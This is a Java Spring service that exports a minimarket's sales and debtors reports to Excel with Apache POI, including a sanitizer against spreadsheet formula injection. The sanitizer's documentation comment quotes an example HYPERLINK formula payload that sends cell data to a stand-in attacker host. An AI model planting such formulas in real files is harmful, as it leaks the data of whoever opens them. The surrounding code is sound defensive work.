package com.minimarket.modules.reports.service;

import com.minimarket.modules.reports.dto.DebtorResponse;
import com.minimarket.modules.reports.dto.DailySalesDto;
import com.minimarket.modules.reports.dto.SalesReportResponse;
import lombok.extern.slf4j.Slf4j;
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.ss.util.CellRangeAddress;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.springframework.stereotype.Service;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.List;

@Slf4j
@Service
public class ExcelExportService {

    private static final DateTimeFormatter DATE_FMT = DateTimeFormatter.ofPattern("dd/MM/yyyy");

    public byte[] generateSalesExcel(SalesReportResponse report, LocalDate start, LocalDate end) {
        try (XSSFWorkbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("Ventas");

            // Styles
            CellStyle headerStyle = createHeaderStyle(workbook);
            CellStyle totalStyle = createTotalStyle(workbook);
            CellStyle currencyStyle = createCurrencyStyle(workbook);
            CellStyle dateStyle = createDateStyle(workbook);

            int rowIdx = 0;

            // Title row
            Row titleRow = sheet.createRow(rowIdx++);
            Cell titleCell = titleRow.createCell(0);
            titleCell.setCellValue("Reporte de Ventas: " + DATE_FMT.format(start) + " - " + DATE_FMT.format(end));
            titleCell.setCellStyle(totalStyle);
            sheet.addMergedRegion(new CellRangeAddress(0, 0, 0, 3));

            rowIdx++; // blank row

            // Summary block
            Row summaryRow1 = sheet.createRow(rowIdx++);
            createLabelCell(summaryRow1, 0, "Total Ventas:", headerStyle);
            summaryRow1.createCell(1).setCellValue(report.totalSales());
            Row summaryRow2 = sheet.createRow(rowIdx++);
            createLabelCell(summaryRow2, 0, "Monto Total:", headerStyle);
            Cell amountCell = summaryRow2.createCell(1);
            amountCell.setCellValue(report.totalAmount().doubleValue());
            amountCell.setCellStyle(currencyStyle);
            Row summaryRow3 = sheet.createRow(rowIdx++);
            createLabelCell(summaryRow3, 0, "Total Descuentos:", headerStyle);
            Cell discCell = summaryRow3.createCell(1);
            discCell.setCellValue(report.totalDiscount().doubleValue());
            discCell.setCellStyle(currencyStyle);

            rowIdx++; // blank row

            // Column headers
            Row headerRow = sheet.createRow(rowIdx++);
            String[] headers = {"Fecha", "Cantidad Ventas", "Total ($)", "Acumulado ($)"};
            for (int i = 0; i < headers.length; i++) {
                Cell cell = headerRow.createCell(i);
                cell.setCellValue(headers[i]);
                cell.setCellStyle(headerStyle);
            }

            // Data rows
            double accumulated = 0;
            for (DailySalesDto daily : report.dailyBreakdown()) {
                Row row = sheet.createRow(rowIdx++);
                Cell dc = row.createCell(0);
                dc.setCellValue(DATE_FMT.format(daily.date()));
                dc.setCellStyle(dateStyle);
                row.createCell(1).setCellValue(daily.saleCount());
                Cell totalCell = row.createCell(2);
                totalCell.setCellValue(daily.totalAmount().doubleValue());
                totalCell.setCellStyle(currencyStyle);
                accumulated += daily.totalAmount().doubleValue();
                Cell accumCell = row.createCell(3);
                accumCell.setCellValue(accumulated);
                accumCell.setCellStyle(currencyStyle);
            }

            // Footer total row
            Row footerRow = sheet.createRow(rowIdx);
            createLabelCell(footerRow, 0, "TOTAL GENERAL:", totalStyle);
            footerRow.createCell(1).setCellValue(report.totalSales());
            Cell footerAmountCell = footerRow.createCell(2);
            footerAmountCell.setCellValue(report.totalAmount().doubleValue());
            footerAmountCell.setCellStyle(currencyStyle);

            // Auto-size columns
            for (int i = 0; i < 4; i++) sheet.autoSizeColumn(i);

            return toBytes(workbook);
        } catch (IOException e) {
            log.error("Error generating sales Excel", e);
            throw new RuntimeException("Failed to generate Excel report", e);
        }
    }

    public byte[] generateDebtorsExcel(List<DebtorResponse> debtors) {
        try (XSSFWorkbook workbook = new XSSFWorkbook()) {
            Sheet sheet = workbook.createSheet("Deudores");

            CellStyle headerStyle = createHeaderStyle(workbook);
            CellStyle currencyStyle = createCurrencyStyle(workbook);

            int rowIdx = 0;

            // Column headers
            Row headerRow = sheet.createRow(rowIdx++);
            String[] headers = {"Nombre Completo", "RUT", "Límite Crédito ($)", "Crédito Usado ($)", "Disponible ($)"};
            for (int i = 0; i < headers.length; i++) {
                Cell cell = headerRow.createCell(i);
                cell.setCellValue(headers[i]);
                cell.setCellStyle(headerStyle);
            }

            // Data rows
            for (DebtorResponse debtor : debtors) {
                Row row = sheet.createRow(rowIdx++);
                // SECURITY: sanitize user-supplied strings to prevent Excel formula injection.
                // Any cell value starting with =, +, -, @ could be interpreted as a formula.
                row.createCell(0).setCellValue(sanitizeExcelCell(debtor.fullName()));
                row.createCell(1).setCellValue(debtor.rut() != null ? sanitizeExcelCell(debtor.rut()) : "");
                Cell limitCell = row.createCell(2);
                limitCell.setCellValue(debtor.creditLimit().doubleValue());
                limitCell.setCellStyle(currencyStyle);
                Cell usedCell = row.createCell(3);
                usedCell.setCellValue(debtor.creditUsed().doubleValue());
                usedCell.setCellStyle(currencyStyle);
                Cell availCell = row.createCell(4);
                availCell.setCellValue(debtor.available().doubleValue());
                availCell.setCellStyle(currencyStyle);
            }

            // Auto-size columns
            for (int i = 0; i < 5; i++) sheet.autoSizeColumn(i);

            return toBytes(workbook);
        } catch (IOException e) {
            log.error("Error generating debtors Excel", e);
            throw new RuntimeException("Failed to generate Excel report", e);
        }
    }

    // ---- style helpers ----

    private CellStyle createHeaderStyle(Workbook wb) {
        CellStyle style = wb.createCellStyle();
        Font font = wb.createFont();
        font.setBold(true);
        style.setFont(font);
        style.setFillForegroundColor(IndexedColors.GREY_25_PERCENT.getIndex());
        style.setFillPattern(FillPatternType.SOLID_FOREGROUND);
        style.setBorderBottom(BorderStyle.THIN);
        style.setBorderTop(BorderStyle.THIN);
        style.setBorderLeft(BorderStyle.THIN);
        style.setBorderRight(BorderStyle.THIN);
        return style;
    }

    private CellStyle createTotalStyle(Workbook wb) {
        CellStyle style = wb.createCellStyle();
        Font font = wb.createFont();
        font.setBold(true);
        font.setFontHeightInPoints((short) 12);
        style.setFont(font);
        style.setFillForegroundColor(IndexedColors.GREY_50_PERCENT.getIndex());
        style.setFillPattern(FillPatternType.SOLID_FOREGROUND);
        return style;
    }

    private CellStyle createCurrencyStyle(Workbook wb) {
        CellStyle style = wb.createCellStyle();
        DataFormat format = wb.createDataFormat();
        style.setDataFormat(format.getFormat("#,##0.00"));
        return style;
    }

    private CellStyle createDateStyle(Workbook wb) {
        CellStyle style = wb.createCellStyle();
        style.setAlignment(HorizontalAlignment.CENTER);
        return style;
    }

    private void createLabelCell(Row row, int col, String label, CellStyle style) {
        Cell cell = row.createCell(col);
        cell.setCellValue(label);
        cell.setCellStyle(style);
    }

    private byte[] toBytes(XSSFWorkbook workbook) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        workbook.write(out);
        return out.toByteArray();
    }

    /**
     * Sanitizes a string value before writing it to an Excel cell.
     *
     * <p>Excel (and LibreOffice Calc) evaluate cell content as a formula when it starts with
     * {@code =}, {@code +}, {@code -}, or {@code @}. An attacker who controls a customer name,
     * RUT, or product name could inject {@code =HYPERLINK("http://evil.example/steal?d="&A1,"click")}
     * or similar payloads (CWE-1236, CSV/Formula Injection).</p>
     *
     * <p>This method prepends a single quote to neutralize any such prefix, which causes
     * spreadsheet applications to treat the value as a plain text literal.</p>
     */
    private String sanitizeExcelCell(String value) {
        if (value == null) return "";
        String trimmed = value.trim();
        if (!trimmed.isEmpty() && "=+-@\t\r".indexOf(trimmed.charAt(0)) >= 0) {
            return "'" + trimmed;
        }
        return trimmed;
    }
}
